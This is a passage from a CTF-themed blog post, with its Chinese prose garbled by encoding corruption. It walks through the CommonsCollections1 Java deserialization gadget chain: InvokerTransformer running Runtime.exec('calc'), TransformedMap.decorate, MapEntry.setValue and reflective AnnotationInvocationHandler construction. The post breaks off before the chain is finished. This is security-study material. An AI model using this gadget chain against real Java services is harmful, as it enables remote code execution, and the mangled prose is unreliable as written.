<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ | æ¥½ã®secret base</title><meta name="author" content="æ¥½ä¾"><meta name="copyright" content="æ¥½ä¾"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="CCä½ çš„">
<meta property="og:type" content="article">
<meta property="og:title" content="CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ">
<meta property="og:url" content="https://leyi.live/2025/12/15/CommonsCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/index.html">
<meta property="og:site_name" content="æ¥½ã®secret base">
<meta property="og:description" content="CCä½ çš„">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://leyi.live/img/post9.jpg">
<meta property="article:published_time" content="2025-12-15T06:34:23.000Z">
<meta property="article:modified_time" content="2025-12-17T08:20:07.308Z">
<meta property="article:author" content="æ¥½ä¾">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://leyi.live/img/post9.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ",
  "url": "https://leyi.live/2025/12/15/CommonsCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/",
  "image": "https://leyi.live/img/post9.jpg",
  "datePublished": "2025-12-15T06:34:23.000Z",
  "dateModified": "2025-12-17T08:20:07.308Z",
  "author": [
    {
      "@type": "Person",
      "name": "æ¥½ä¾",
      "url": "https://leyi.live"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://leyi.live/2025/12/15/CommonsCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><style>
  #custom-loading {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #0B0B0B;
    z-index: 9999;
    display: flex;
    justify-content: center;
    align-items: center;
    transition: opacity 0.5s ease;
  }
  .loading-content {
    position: relative;
    width: 100%;
    height: 100%;
  }
  .loading-content span {
    width: 8vmin;
    height: 8vmin;
    border-radius: 4vmin;
    backface-visibility: hidden;
    position: absolute;
    animation-name: loadingMove;
    animation-timing-function: cubic-bezier(0.4, 0, 1, 0.8);
    animation-iteration-count: infinite;
    animation-duration: 3s;
    top: 50%;
    left: 50%;
    transform-origin: -4vmin center;
  }
  .loading-content span:nth-child(1) { background: #E5E6E5; animation-delay: -0.5s; opacity: 0; }
  .loading-content span:nth-child(2) { background: #494A49; animation-delay: -1s; opacity: 0; }
  .loading-content span:nth-child(3) { background: #8F908F; animation-delay: -1.5s; opacity: 0; }
  .loading-content span:nth-child(4) { background: #E5E6E5; animation-delay: -2s; opacity: 0; }
  .loading-content span:nth-child(5) { background: #494A49; animation-delay: -2.5s; opacity: 0; }
  .loading-content span:nth-child(6) { background: #8F908F; animation-delay: -3s; opacity: 0; }
  @keyframes loadingMove {
    0% { transform: scale(1) rotate(0deg) translate3d(0, 0, 1px); }
    30% { opacity: 1; }
    100% { z-index: 10; transform: scale(0) rotate(360deg) translate3d(0, 0, 1px); }
  }
</style>
<script>
  // ç«‹å³å†™å…¥åŠ è½½åŠ¨ç”»ï¼Œä¸ç­‰å¾…ä»»ä½•äº‹ä»¶
  document.write(`
    <div id="custom-loading">
      <div class="loading-content">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </div>
    </div>
  `);
</script>
<meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> æ–‡ç« </span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> é“¾æ¥</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post9.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/bar0.gif" alt="Logo"><span class="site-name">æ¥½ã®secret base</span></a><a class="nav-page-title" href="/"><span class="site-name">CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> æ–‡ç« </span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> é“¾æ¥</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-15T06:34:23.000Z" title="Created 2025-12-15 14:34:23">2025-12-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-17T08:20:07.308Z" title="Updated 2025-12-17 16:20:07">2025-12-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9B%B8%E5%85%B3/">CTFç›¸å…³</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ"><a href="#CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ" class="headerlink" title="CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ"></a>CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ</h1><p>å¦‚æœJavaé¡¹ç›®å…·æœ‰<code>Commons Collections3.2.1</code>ä¾èµ–ï¼Œåˆ™ä¼šå­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨æ¼æ´</p>
<p>è¯¥é“¾ä¸­ï¼Œç»ˆç‚¹æ˜¯<code>InvokerTransformer</code>ç±»ï¼Œå®ƒæ˜¯æ¥å£<code>transform</code>çš„ä¸€ä¸ªå®ç°ç±»ï¼Œå…¶é‡å†™çš„<code>transform()</code>æ–¹æ³•å¯ä»¥é€šè¿‡åå°„çš„æ–¹å¼è°ƒç”¨å±é™©æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ‰§è¡Œçš„å°±æ˜¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ï¼Œå¯»æ‰¾è°ƒç”¨äº†<code>transform</code>çš„ç±»æˆ–å®ä¾‹ï¼Œåœ¨<code>TransformedMap</code>ç±»ä¸‹çš„<code>checkSetValue()</code>æ–¹æ³•å­˜åœ¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯æƒœï¼Œè¯¥æ–¹æ³•åŠè¯¥ç±»çš„æ„é€ å™¨éƒ½è¢«<code>protected</code>ä¿®é¥°ï¼Œæ— æ³•åœ¨ç±»å¤–è°ƒç”¨ï¼Œä½†æ˜¯å¾€ä¸Šç¿»å¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>decorate()</code>æ–¹æ³•å¯ä»¥å¯¹<code>valueTransformer</code>è¿›è¡Œèµ‹å€¼</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆå¯¹ç°æœ‰çš„é“¾è¿›è¡ŒåŒ…è£…</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br></pre></td></tr></table></figure>

<p>ä¸‹ä¸€æ­¥æ˜¯æ‰¾åˆ°èƒ½è§¦å‘<code>checkSetValue()</code>æ–¹æ³•çš„æœºä¼šï¼Œä»<code>MapEntry</code>ç±»çš„<code>setValue()</code>æ–¹æ³•é‡Œçœ‹åˆ°äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>ç®€å•è¯´çš„è¯ï¼Œæˆ‘ä»¬ä»<code>TransformedMap</code>é‡Œéå†å‡ºçš„å…ƒç´ å°±æ˜¯<code>MapEntry</code>çš„å®ä¾‹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨forå¢å¼ºæå–å‡ºå•ä¸ª<code>entry</code>å»ä½¿ç”¨<code>setValue()</code>æ–¹æ³•ï¼Œå¤„ç†å®Œåçš„é“¾</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;Object,Object&gt; entry : transformedMap.entrySet()) &#123;</span><br><span class="line">    entry.setValue(Runtime.getRuntime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¦ç»†ç‚¹è¯´ï¼Œ<code>transformedMap</code>åœ¨éå†è°ƒç”¨<code>entrySet()</code>æ—¶ï¼Œä½¿ç”¨äº†çˆ¶ç±»é‡å†™çš„<code>entrySet()</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">EntrySet</span>(<span class="built_in">this</span>.map.entrySet(), <span class="built_in">this</span>) : <span class="built_in">this</span>.map.entrySet());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è€Œè¿™é‡Œè°ƒç”¨çš„<code>isSetValueChecking()</code>æ˜¯<code>transformedMap</code>è‡ªå·±çš„<code>isSetValueChecking()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isSetValueChecking</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¾€å‰è°ƒç”¨<code>decorate()</code>æ–¹æ³•æ—¶ï¼Œ<code>valueTransformer</code>è¢«èµ‹å€¼ä¸º<code>invokerTransformer</code>ï¼Œæ‰€ä»¥<code>isSetValueChecking()</code>ä¼šè¿”å›<code>true</code>ï¼Œå¯¹åº”åˆ°<code>entrySet()</code>é‡Œå°±æ˜¯è¿”å›åŒ…è£…åçš„<code>EntrySet</code>å®ä¾‹</p>
<p>åœ¨for-eachå¾ªç¯ä¸­ï¼Œä¼šéšå¼è°ƒç”¨è¿™ä¸ªè‡ªå®šä¹‰ <code>EntrySet</code> çš„ <code>iterator()</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª <code>EntrySetIterator</code> å®ä¾‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(<span class="built_in">this</span>.collection.iterator(), <span class="built_in">this</span>.parent);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>å½“<code>EntrySetIterator</code>å°è¯•ä½¿ç”¨<code>next()</code>æ–¹æ³•è·å–ä¸‹ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œè¯¥æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ª<code>MapEntry</code>ç±»å‹çš„å®ä¾‹ï¼Œè¿™å°±æ˜¯èƒ½æ‹¿åˆ°<code>MapEntry</code>çš„å…¨è¿‡ç¨‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry)<span class="built_in">this</span>.iterator.next();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, <span class="built_in">this</span>.parent);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿”å›çš„<code>MapEntry</code>çš„<code>parent</code>å±æ€§æ¥æºäº<code>EntrySetIterator</code>çš„<code>parent</code>ï¼Œè€Œ<code>EntrySetIterator</code>çš„<code>parent</code>æ¥è‡ªäº<code>EntrySet</code>çš„<code>parent</code>ï¼Œ<code>EntrySet</code>ç”±<code>AbstractInputCheckedMapDecorator</code>ç±»çš„<code>entrySet()</code>æ–¹æ³•äº§ç”Ÿï¼Œåœ¨æ„å»ºæ—¶ç»™<code>parent</code>ä¼ é€’çš„å°±æ˜¯<code>AbstractInputCheckedMapDecorator</code>ç±»å‹ï¼Œå¯¹åº”åˆ°é“¾ä¸­ï¼Œéå†ç”±<code>transformedMap</code>å‘èµ·ï¼Œè€Œ<code>transformedMap</code>çš„ç±»æ˜¯<code>TransformedMap</code>ï¼Œç»§æ‰¿äº<code>AbstractInputCheckedMapDecorator</code>ç±»ï¼Œæ‰€ä»¥æœ€å<code>MapEntry</code>æ‰§è¡Œçš„<code>setValue()</code>å®é™…å°±æ˜¯<code>transformedMap.checkSetValue()</code></p>
<blockquote>
<p>å¦‚æœå•å•çŸ¥é“éå†è¿‡ç¨‹è¿”å›äº†ä¸€ä¸ªMapEntryå€’è¿˜å¥½ï¼Œä½†æ˜¯è¦æº¯æºè¿™ä¸€æ•´ä¸ªè¿‡ç¨‹å±å®å¾ˆå›°éš¾ï¼Œå…¶ä¸­æ¶‰åŠåˆ°å¾ˆå¤šç»§æ‰¿å…³ç³»å’Œå®ç°ç±»ä¸æ¥å£ï¼Œå®Œå…¨çš„æŠ½è±¡ï¼Œè¿™å¾ˆJava</p>
</blockquote>
<p>æ¥ä¸‹æ¥ç»§ç»­å¯»æ‰¾<code>setValue()</code>çš„ä¸Šå±‚ï¼Œå‘ç°åœ¨<code>AnnotationInvocationHandler</code>ç±»çš„<code>readObject()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>setValue()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var10 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var10.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry var5 : <span class="built_in">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>var5</code>æ˜¯ä»å±æ€§<code>this.memberValues</code>éå†å‡ºæ¥çš„ï¼Œè·Ÿæˆ‘ä»¬å…ˆå‰çš„æ„é€ æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œä¸‹é¢çœ‹<code>memberValues</code>æ˜¯ä»æ„é€ å™¨ä¸­è¢«èµ‹å€¼çš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="built_in">this</span>.type = var1;</span><br><span class="line">            <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯<code>AnnotationInvocationHandler</code>ç±»çš„ä¿®é¥°ç¬¦æ˜¯<code>default</code>ï¼Œæ— æ³•åœ¨åŒ…å¤–è°ƒç”¨ï¼Œéœ€è¦åˆ©ç”¨åå°„å»å®ä¾‹åŒ–å®ƒ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap)</span><br></pre></td></tr></table></figure>

<p>ç†è®ºä¸Šç›´æ¥å¾€<code>var2</code>ä¼ <code>transformedMap</code>åé¢çš„<code>var5</code>å°±æ˜¯éœ€è¦çš„<code>MapEntry</code>ï¼Œä½†æ˜¯è¦æ‰§è¡Œåˆ°<code>var5.setValue()</code>è¿˜æœ‰ä¸¤å±‚ifåˆ¤æ–­éœ€è¦å¤„ç†</p>
<blockquote>
<p>æ ¹æ®<code>String var6 = (String)var5.getKey()</code>ï¼Œ<code>var6</code>æ˜¯ä»<code>this.memberValues</code>æå–å‡ºçš„é”®å</p>
</blockquote>
